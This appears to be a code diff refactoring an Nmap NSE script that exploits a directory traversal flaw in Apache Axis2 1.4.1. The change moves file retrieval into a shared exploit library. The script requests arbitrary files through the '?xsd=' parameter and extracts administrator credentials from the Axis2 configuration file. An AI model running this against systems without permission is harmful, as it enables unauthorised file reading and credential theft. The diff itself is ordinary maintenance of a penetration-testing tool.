@@ -6,6 +6,7 @@ local shortport = require "shortport"
 local stdnse = require "stdnse"
 local string = require "string"
 local table = require "table"
+local exploit = require "exploit"
 
 description = [[
 Exploits a directory traversal vulnerability in Apache Axis2 version 1.4.1 by
@@ -83,22 +84,6 @@ local function get_available_services(body)
 end
 
 ---
---Writes string to file
---Taken from: hostmap.nse
--- @param filename Filename to write
--- @param contents Content of file
--- @return True if file was written successfully
-local function write_file(filename, contents)
-  local f, err = io.open(filename, "w")
-  if not f then
-    return f, err
-  end
-  f:write(contents)
-  f:close()
-  return true
-end
-
----
 -- Extracts Axis2's credentials from the configuration file
 -- It also adds them to the credentials library.
 -- @param body Configuration file string
@@ -149,27 +134,20 @@ action = function(host, port)
 
   --Use selected service and exploit
   stdnse.debug1("Querying service: %s", selected_service)
-  req = http.get(host, port, basepath..selected_service.."?xsd="..rfile)
+  local payload = basepath..selected_service.."?xsd="
+  local status, lfi_success, result = exploit.lfi_check(host, port, payload, rfile, outfile)
   stdnse.debug2("Query -> %s", basepath..selected_service.."?xsd="..rfile)
 
   --response came back
-  if req.status and req.status == 200 then
-    --if body is empty something wrong could have happened...
-    if string.len(req.body) <= 0 then
-      if nmap.verbosity() >= 2 then
-        stdnse.debug1("Response was empty. The file does not exists or the web server does not have sufficient permissions")
-      end
-      return
-    end
-
+  if lfi_success then
     output[#output+1] = "\nApache Axis2 Directory Traversal (OSVDB-59001)"
 
     --Retrieve file or only show credentials if downloading the configuration file
     if rfile ~= DEFAULT_FILE then
-      output[#output+1] = req.body
+      output[#output+1] = result
     else
       --try to extract credentials
-      local extract_st, extract_msg = extract_credentials(host, port, req.body)
+      local extract_st, extract_msg = extract_credentials(host, port, result)
       if extract_st then
         output[#output+1] = extract_msg
       else
@@ -177,15 +155,6 @@ action = function(host, port)
       end
     end
 
-    --save to file if selected
-    if outfile then
-      local status, err = write_file(outfile, req.body)
-      if status then
-        output[#output+1] = string.format("%s saved to %s\n", rfile, outfile)
-      else
-        output[#output+1] = string.format("Error saving %s to %s: %s\n", rfile, outfile, err)
-      end
-     end
   else
     stdnse.debug1("Request did not return status 200. File might not be found or unreadable")
     return
